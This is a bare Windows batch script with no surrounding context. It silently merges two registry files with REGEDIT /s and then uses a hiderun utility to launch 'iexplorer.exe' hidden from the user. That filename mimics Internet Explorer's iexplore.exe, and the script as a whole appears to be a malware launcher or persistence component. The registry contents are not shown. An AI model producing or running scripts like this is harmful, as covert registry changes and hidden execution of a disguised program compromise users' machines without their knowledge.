@echo off

REGEDIT.EXE /s re11.REG
REGEDIT.EXE /s re12.REG

hiderun.exe iexplorer.exe 


exit